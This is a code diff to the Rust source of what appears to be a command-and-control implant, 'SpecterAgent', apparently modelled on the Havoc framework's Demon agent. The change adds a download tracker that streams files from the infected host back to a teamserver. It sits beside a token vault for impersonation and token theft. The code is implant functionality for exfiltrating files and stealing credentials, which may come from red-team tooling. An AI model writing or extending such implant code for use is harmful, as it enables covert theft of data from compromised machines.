@@ -9,6 +9,7 @@ use tracing::{info, warn};
 
 use crate::config::SpecterConfig;
 use crate::dispatch::{self, DispatchResult};
+use crate::download::DownloadTracker;
 use crate::error::SpecterError;
 use crate::protocol::{
     AgentMetadata, build_callback_packet, build_init_packet, parse_init_ack, parse_tasking_response,
@@ -31,6 +32,8 @@ pub struct SpecterAgent {
     ctr_offset: u64,
     /// Token vault for impersonation/steal/make operations.
     token_vault: TokenVault,
+    /// Active file downloads being streamed back to the teamserver.
+    downloads: DownloadTracker,
 }
 
 impl SpecterAgent {
@@ -62,6 +65,7 @@ impl SpecterAgent {
             transport,
             ctr_offset: 0,
             token_vault: TokenVault::new(),
+            downloads: DownloadTracker::new(),
         })
     }
 
@@ -179,10 +183,31 @@ impl SpecterAgent {
             };
 
             for package in &message.packages {
-                let result = dispatch::dispatch(package, &mut self.config, &mut self.token_vault);
+                let result = dispatch::dispatch(
+                    package,
+                    &mut self.config,
+                    &mut self.token_vault,
+                    &mut self.downloads,
+                );
                 if self.handle_dispatch_result(package.request_id, result).await {
                     // Exit requested — terminate.
                     return Ok(());
+                }
+            }
+
+            // Push pending download chunks (mirrors Demon's DownloadPush).
+            let fs_cmd_id = u32::from(DemonCommand::CommandFs);
+            let download_packets = self.downloads.push_chunks(fs_cmd_id);
+            for pkt in download_packets {
+                if let Err(e) =
+                    self.send_callback_raw(pkt.command_id, pkt.request_id, &pkt.payload).await
+                {
+                    warn!(
+                        agent_id = format_args!("0x{:08X}", self.agent_id),
+                        command_id = pkt.command_id,
+                        error = %e,
+                        "failed to send download chunk"
+                    );
                 }
             }
         }
